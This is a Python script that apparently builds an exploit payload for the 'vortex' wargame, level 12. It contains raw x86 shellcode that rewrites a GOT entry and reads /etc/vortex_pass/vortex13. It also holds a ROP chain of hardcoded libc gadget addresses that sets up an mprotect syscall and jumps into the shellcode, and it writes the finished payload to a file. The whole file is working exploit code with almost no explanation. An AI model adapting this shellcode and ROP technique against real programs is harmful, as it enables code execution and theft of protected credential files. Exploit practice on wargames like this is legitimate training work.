import struct
def main():
    #Rewrite GOT, loop till death
    buf = "\x31\xc0\xb8\x0c\xa0\x04\x08\x31\xdb\xbb\xac\xce\xff\xff\x89\x18\xeb\xfe"

    #cat /etc/vortex_pass/vortex13
    buf2 =  ""
    buf2 += "\xbf\x77\xe7\x39\x1f\xd9\xd0\xd9\x74\x24\xf4\x5e\x29"
    buf2 += "\xc9\xb1\x11\x83\xee\xfc\x31\x7e\x0f\x03\x7e\x78\x05"
    buf2 += "\xcc\x75\x8d\x91\xb6\xd8\xf7\x49\xe4\xbf\x7e\x6e\x9e"
    buf2 += "\x10\xf3\x19\x5f\x07\xdc\xbb\x36\xb9\xab\xdf\x9b\xad"
    buf2 += "\xb5\x1f\x1c\x2e\xaa\x7e\x68\x0e\x03\xe4\xe4\x2d\x74"
    buf2 += "\x90\x6b\xc0\xfe\x39\x0c\x7b\x8e\xa0\x9f\xf0\x41\x55"
    buf2 += "\x0f\x85\xe9\xfc\xb7\x58\x22\xff\x10\xc8\xcd\x1e\x53"
    buf2 += "\x6e"

    payload_length = 0x40c

    #Some nops
    payload = "\x90"*8
    payload_length-=8
	
    #Add the got rewrite for printf
    payload+=buf
    payload_length-=len(buf)
    
    #Add some spacing between the primary shellcode and the secondary
    payload+="\x90"*100
    payload_length-=100

    #add password printing and exit shellcode
    payload+=buf2
    payload_length-=len(buf2)

    #Finish padding
    payload+="\x90"*payload_length

    #Note should probably make the offsets based on a constant of libc and .text addresses
    payload+=struct.pack("<L",0xf7e79448) #ecx=1,eax=1
    payload+=struct.pack("<L",0xffffbfff)#*ebx=0xffffbfff
    payload+="AAAA" #esi=AAAA
    payload+="BBBB" #edi=BBBB
    payload+="CCCC" #ebp=CCCC
    payload+=struct.pack("<L",0xf7e6dbbc) #ebx=0xffffc000
    payload+=struct.pack("<L",0x0804862a) #ecx=2
    payload+=struct.pack("<L",0x0804862a) #ecx=4
    payload+=struct.pack("<L",0x0804862a) #ecx=8
    payload+=struct.pack("<L",0x0804862a) #ecx=16
    payload+=struct.pack("<L",0x0804862a) #ecx=32
    payload+=struct.pack("<L",0x0804862a) #ecx=64
    payload+=struct.pack("<L",0x0804862a) #ecx=128
    payload+=struct.pack("<L",0x0804862a) #ecx=256
    payload+=struct.pack("<L",0x0804862a) #ecx=512
    payload+=struct.pack("<L",0x0804862a) #ecx=1024
    payload+=struct.pack("<L",0x0804862a) #ecx=2048
    payload+=struct.pack("<L",0x0804862a) #ecx=4096
    payload+=struct.pack("<L",0xf7f21029) #eax=0,edx=0
    payload+=struct.pack("<L",0xf7f1ea9d) #eax=127
    payload+=struct.pack("<L",0xf7f2b686) #eax=126
    payload+=struct.pack("<L",0xf7f2b686) #eax=125
    payload+=struct.pack("<L",0xf7f313c7) #edx=1
    payload+=struct.pack("<L",0xf7f313c7) #edx=2
    payload+=struct.pack("<L",0xf7f313c7) #edx=3
    payload+=struct.pack("<L",0xf7f313c7) #edx=4
    payload+=struct.pack("<L",0xf7f313c7) #edx=5
    payload+=struct.pack("<L",0xf7f313c7) #edx=6
    payload+=struct.pack("<L",0xf7f313c7) #edx=7
    payload+=struct.pack("<L",0xf7ef1b31) #int 0x80
    payload+="AAAA" #ebp=AAAA
    payload+="BBBB" #edi=BBBB
    payload+=struct.pack("<L",0xffffce50) #esi=0xffffce50
    payload+="DDDD" #ebx=DDDD
    payload+=struct.pack("<L",0xf7e67565) #push esi; ret

    fp = open("test.txt","wb")
    fp.write(payload)
    fp.close()
    pass
main()
